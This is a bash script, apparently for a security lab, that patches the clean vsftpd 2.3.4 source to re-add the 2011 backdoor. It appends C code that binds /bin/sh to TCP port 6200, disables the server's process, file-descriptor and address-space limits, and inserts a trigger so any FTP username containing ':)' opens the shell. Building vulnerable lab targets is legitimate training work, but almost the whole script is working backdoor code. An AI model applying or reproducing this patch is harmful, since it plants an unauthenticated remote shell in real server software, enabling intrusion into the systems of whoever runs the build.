#!/bin/bash
# Recreate the vsftpd 2.3.4 backdoor in the (clean) upstream source.
# Trigger: an FTP username containing ":)" -> bind /bin/sh on TCP port 6200.
# (The historically-distributed 2.3.4 tarball was trojaned in 2011; the copy
#  recovered here is the clean release, so we re-add the same behaviour for the lab.)
set -e
SRC="$1"   # path to the extracted vsftpd-2.3.4 directory
cd "$SRC"

cat >> sysdeputil.c <<'EOF'

/* ===== Lab-recreated vsftpd 2.3.4 backdoor ===== */
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h>
int
vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) exit(1);
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if (bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr)) < 0) exit(1);
  if (listen(fd, 100) == -1) exit(1);
  for (;;)
  {
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh", "sh", (char *)0);
  }
  return 0;
}
EOF

# Neutralise vsftpd's per-session resource limits so the backdoor shell can
# exec /bin/sh (address space) and fork external commands (RLIMIT_NPROC).
sed -i 's/vsf_sysutil_set_address_space_limit(limit);/(void)limit;/' main.c
sed -i 's/vsf_sysutil_set_no_procs();/\/* backdoor: keep procs *\//' secutil.c
sed -i 's/vsf_sysutil_set_no_fds();/\/* backdoor: keep fds *\//' secutil.c

# Make the backdoor function visible to prelogin.c
sed -i '/#include "opts.h"/a extern int vsf_sysutil_extra(void);' prelogin.c

# Trigger right after the username is captured: if it contains ":)" -> backdoor
sed -i 's#str_copy(&p_sess->user_str, &p_sess->ftp_arg_str);#&\n  { unsigned int i_bd; for (i_bd = 0; i_bd + 1 < str_getlen(\&p_sess->user_str); i_bd++) if (str_get_char_at(\&p_sess->user_str, i_bd) == 0x3a \&\& str_get_char_at(\&p_sess->user_str, i_bd + 1) == 0x29) vsf_sysutil_extra(); }#' prelogin.c

echo "[backdoor] markers (expect >=1 each):"
echo "  prelogin call:   $(grep -c vsf_sysutil_extra prelogin.c)"
echo "  sysdeputil func: $(grep -c vsf_sysutil_extra sysdeputil.c)"
echo "  port 6200:       $(grep -c 6200 sysdeputil.c)"
